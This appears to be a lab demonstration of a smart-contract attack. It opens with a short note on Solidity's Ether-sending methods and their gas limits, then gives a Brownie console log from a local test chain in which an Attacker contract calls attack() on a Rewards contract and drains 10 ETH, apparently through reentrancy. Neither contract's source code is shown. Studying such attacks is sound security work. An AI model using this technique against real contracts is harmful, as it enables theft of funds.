

there are three general ways to send Ether to smart contracts:

    address.send() -- gas limit: 2300
    address.transfer() -- gas limit: 2300
    address.call.value() -- no gas limit 


```
brownie run scripts/run1.py
Brownie v1.17.2 - Python development framework for Ethereum

Simpletest1Project is the active project.

Launching 'ganache-cli --port 8545 --gasLimit 12000000 --accounts 10 --hardfork istanbul --mnemonic brownie'...

Running 'scripts/run1.py::main'...
===============================================================
initial balance of account(0) in Eth =100.000000000000000000
===============================================================
Transaction sent: 0x3e30d7d4c1dd22357b00c1e4e7cd4c2b31a956bb9589482e4e1a7eb714ea4fa5
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Rewards.constructor confirmed   Block: 1   Gas used: 129475 (1.08%)
  Rewards deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87

===============================================================
Rewards deploy done ; from=0x66aB6D9362d4F35596279692F0251Db635165871 
===============================================================
===============================================================
target balance=0 = 0E-18
===============================================================
===============================================================
account(0) balance in Eth =100.000000000000000000
===============================================================
Transaction sent: 0x48466243cde681165694651e39524a6010c08799f0e5b109cc878a422c7b6d43
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  Rewards.deposit confirmed   Block: 2   Gas used: 21258 (0.18%)

===============================================================
target deposit 2 ETH
===============================================================
===============================================================
target balance=20000000000000000000 = 20.000000000000000000
===============================================================
===============================================================
account(0) balance in Eth =80.000000000000000000
===============================================================
===============================================================
target allow 2 gifts
===============================================================
Transaction sent: 0x602c3069801e8149bac5cdb2696cfb30d6eadbbbb5a0e7d7627265126e1eb388
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 2
  Rewards.allowGifts confirmed   Block: 3   Gas used: 41365 (0.34%)

===============================================================
giftsCount=2
===============================================================
===============================================================
target withdraw
===============================================================
Transaction sent: 0x049c7ee81f2cbfc217f49f778fabc5c16da448ad0c2e4c2462fa7637b6a82753
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 3
  Rewards.withdraw confirmed   Block: 4   Gas used: 35356 (0.29%)

===============================================================
giftsCount=1
===============================================================
===============================================================
target balance=19000000000000000000 = 19.000000000000000000
===============================================================
===============================================================
account(0) balance in Eth =81.000000000000000000
===============================================================
===============================================================
attacker balance of account in Eth =100.000000000000000000
===============================================================
===============================================================
Attacker deploy with target address =0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87 
===============================================================
Transaction sent: 0x0f3e68c8f76fdea2cb4abef540292d3f2870b6ca3838eb8771129e293a7b6b2b
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Attacker.constructor confirmed   Block: 5   Gas used: 222943 (1.86%)
  Attacker deployed at: 0xe7CB1c67752cBb975a56815Af242ce2Ce63d3113

===============================================================
Attacker deploy done ; from=0x33A4622B82D4c04a53e170c638B944ce27cffce3 
===============================================================
===============================================================
Attacker init balance=0 = 0E-18
===============================================================
===============================================================
Attacker get target balance=19000000000000000000 = 19.000000000000000000
===============================================================
Transaction sent: 0xb0552f56fa5131a1a4b98ec3c7e9068bb02629ea1e7c0db81c35f6cb142e0cdc
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  Attacker.attack confirmed   Block: 6   Gas used: 233004 (1.94%)

  Attacker.attack confirmed   Block: 6   Gas used: 233004 (1.94%)

===============================================================
Attacker finished balance=10000000000000000000 = 10.000000000000000000
===============================================================

```
